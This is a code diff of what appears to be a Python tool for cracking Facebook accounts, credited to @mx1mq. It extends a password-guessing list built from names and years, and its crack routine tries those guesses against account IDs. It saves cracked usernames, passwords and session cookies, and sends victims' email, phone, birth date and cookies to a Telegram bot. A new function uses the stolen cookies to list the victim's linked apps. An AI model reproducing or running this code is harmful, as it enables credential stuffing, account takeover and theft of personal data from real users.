 					pwv.append('1234512345')
+					pwv.append('19941994')
 					pwv.append('19991999')
 					pwv.append('19981998')
 					pwv.append('123456123456')
@@ -1101,8 +1204,6 @@ def passwrd():
 					pwv.append('20042004')
 					pwv.append('20052005')
 					pwv.append('20202020')
-					pwv.append('20232023')
-					pwv.append('20222022')
 					
 					
 			else:
@@ -1113,10 +1214,12 @@ def passwrd():
 					pwv.append(frs + frs)
 					pwv.append(frs +' '+frs)
 					pwv.append('first last')
+					pwv.append('firstlast')
 					pwv.append('last last')
 					pwv.append(frs + '1234')
 					pwv.append(frs + '123456')
 					pwv.append(frs + '12')
+					pwv.append(frs + '123')
 					pwv.append(frs + '2021')
 					pwv.append(frs + '2022')
 					pwv.append(frs + '2020')
@@ -1127,16 +1230,19 @@ def passwrd():
 					pwv.append(frs + '2001')
 					pwv.append(frs + '2000')
 					pwv.append(frs + '2006')
-					pwv.append(frs + '2009')
+					pwv.append(frs + '1994')
 					pwv.append(frs + '2008')
 					pwv.append(frs + '2007')
 					pwv.append(frs + '1999')
+					pwv.append(frs + '1995')
+					pwv.append(frs + '@1994')
 					pwv.append(frs + '1998')
 					pwv.append(frs + '1997')
 					pwv.append(frs + '1212')
 					pwv.append('12345@12345')
-					pwv.append('123@123')
-					pwv.append('123412345')
+					pwv.append('1994@1994')
+					pwv.append('1234512345')
+					pwv.append('19941994')
 					pwv.append('19991999')
 					pwv.append('19981998')
 					pwv.append('123456123456')
@@ -1177,14 +1283,15 @@ def passwrd():
 		print(f'\t{x}[=]{k} Been completed {x} <> ')
 		time.sleep(2)
 		exit()
+		
 
 
 def crack(idf,pwv):
 	global loop,ok,cp
-	bi = random.choice([u,k,kk,b,h,hh])
+	bi = random.choice([a3,a4,a5,a6,a7,a10,a12,a14,u,k,kk,b,h,hh,a19,a20,a21,a22,a23,a24,a25,a26,a27,a36,a37,a40,xxh,])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s [𝙼𝙸𝙼𝙾 𝐕𝐈𝐏] %s/%s || [OK] - %s || [CP] - %s || %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s [𝙼𝙸𝙼𝙾 𝐕𝐈𝐏] %s/%s || [ 𝐎𝐊 ] - %s || [𝐶𝑃] - %s || %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
@@ -1204,8 +1311,8 @@ def crack(idf,pwv):
 					print('\n')
 					statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️
 ⋘─────━𓆩مدفوع𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
-❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
+♨️ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
+♨️ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
 سكيور حض اوفر حبيبي 
 ⋘─────━𓆩مدفوع𓆪‏━─────⋙
 BY = @mx1mq |'''
@@ -1225,12 +1332,16 @@ BY = @mx1mq |'''
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️
-⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
-❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍ @mx1mq      𓆩𝙼𝙸𝙼𝙾𓆪    @mx1mq ❍  
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
+♨️ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
+♨️ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
 
 
-⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍ @mx1mq      𓆩𝙼𝙸𝙼𝙾𓆪    @mx1mq ❍  
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
 BY = @mx1mq'''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title=' NO SESI'))
@@ -1267,10 +1378,14 @@ BY = @mx1mq'''
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += f'''ميمو جابلك حساب صحيح تعال 
-⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n└──COOKIES: {kuki}\n
-⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
+					infoakun += f'''ميمو جابلك حساب  تعال 
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍ @mx1mq      𓆩𝙼𝙸𝙼𝙾𓆪    @mx1mq ❍  
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
+♨️ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n♨️ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ -𝐄𝐌𝐀𝐈L  : {email}\n❖ - 𝐍𝗨𝐌𝐁𝐄𝐑 : {nomer}\n❖ - 𝐃𝐀𝐓𝐄 𝐂𝐑𝐄𝐀𝐓𝐄 : {tahun}\n❖ - 𝐃𝐀𝐓𝐄 𝐎𝐅 𝐁𝐈𝐑𝐓𝐇 : {ttl}\n└──⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 : {kuki}\n
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍ @mx1mq      𓆩𝙼𝙸𝙼𝙾𓆪    @mx1mq ❍  
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
 BY = @mx1mq '''
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
 
@@ -1307,7 +1422,8 @@ BY = @mx1mq '''
 					'''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
-					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					#requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					cek_RMAD(kuki)
 					break
 
 
@@ -1316,6 +1432,26 @@ BY = @mx1mq '''
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
+def cek_RMAD(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
 def O():
 	try:
 		os.remove('ID.txt')
